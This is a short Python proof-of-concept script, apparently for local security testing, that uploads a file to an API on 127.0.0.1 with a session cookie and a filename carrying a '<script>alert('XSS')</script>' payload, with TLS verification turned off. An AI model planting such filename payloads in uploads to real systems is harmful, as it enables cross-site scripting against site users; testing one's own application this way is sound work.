import requests
import urllib3

# Disable SSL warnings for local testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1:5000/api/upload"

# Insert a valid session token from a standard user
headers = {
    "Cookie": "session_token = OqsajzBz5BesTUv3XcVOpB99MDAT4toxeSjuLMWExak"
}

# The 'files' dictionary allows us to define a custom filename 
# completely independent of the local file system.
files = {
    'document': (
        "<script>alert('XSS')</script>.txt",  # The malicious payload
        b"Simulated file content.",           # Dummy binary data
        "text/plain"                          # Content-Type
    )
}

response = requests.post(url, headers=headers, files=files, verify=False)

print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.json()}")